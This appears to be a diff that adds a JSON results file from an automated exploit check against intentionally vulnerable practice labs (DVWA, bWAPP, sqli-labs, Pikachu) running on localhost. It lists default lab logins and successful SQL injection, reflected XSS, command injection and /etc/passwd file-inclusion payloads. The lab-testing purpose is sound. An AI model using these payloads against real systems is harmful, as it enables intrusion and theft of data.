@@ -1,0 +1,42 @@
+{
+  "run_at": "2026-06-10T08:46:50+08:00",
+  "version": "0.3.0",
+  "environments": {
+    "dvwa": { "url": "http://localhost:8080", "credentials": ["admin", "password"], "security_level": "low" },
+    "bwapp": { "url": "http://localhost:8081", "credentials": ["bee", "bug"] },
+    "sqli-labs": { "url": "http://localhost:8082", "credentials": ["root", ""] },
+    "pikachu": { "url": "http://localhost:8083", "credentials": [null, null] }
+  },
+  "container_status": {
+    "dvwa": "200 OK",
+    "bwapp": "302 OK (redirect to install/login)",
+    "sqli-labs": "200 OK",
+    "pikachu": "200 OK"
+  },
+  "poc_results": {
+    "dvwa": {
+      "sqli_get":      { "url": "/vulnerabilities/sqli/?id=' OR '1'='1",     "result": "SUCCESS", "evidence": "dumped 5 users (admin, Gordon, Hack, Pablo, Bob)" },
+      "xss_reflected": { "url": "/vulnerabilities/xss_r/?name=<script>...", "result": "SUCCESS", "evidence": "payload echoed unescaped in <pre>" },
+      "command_inj_post": { "url": "/vulnerabilities/exec/ (POST)",     "result": "SUCCESS", "evidence": "uid=33(www-data) gid=33(www-data) groups=33(www-data)" },
+      "lfi":           { "url": "/vulnerabilities/fi/?page=/etc/passwd",  "result": "SUCCESS", "evidence": "root:x:0:0:... line present in response" },
+      "upload":        { "url": "/vulnerabilities/upload/",              "result": "REACHABLE", "evidence": "endpoint accepts multipart uploads" }
+    },
+    "sqli-labs": {
+      "less1_sqli_string": { "url": "/Less-1/?id=1'", "result": "SUCCESS", "evidence": "MySQL syntax error in response" }
+    },
+    "pikachu": {
+      "sqli_str_error": { "url": "/vul/sqli/sqli_str.php?name=1'", "result": "SUCCESS", "evidence": "SQL syntax error in response" }
+    },
+    "bwapp": {
+      "login": { "url": "/login.php", "result": "SUCCESS", "evidence": "logged in with bee/bug (captcha='')" },
+      "sqli_search": { "url": "/sqli_1.php?title=' OR '1'='1", "result": "PROBABLE", "evidence": "multiple rows returned" }
+    }
+  },
+  "summary": {
+    "total_pocs_attempted": 9,
+    "successful": 8,
+    "probable": 1,
+    "failed": 0,
+    "vulnerability_types_proven_exploitable": ["SQLi", "XSS", "RCE", "LFI", "FileUpload"]
+  }
+}
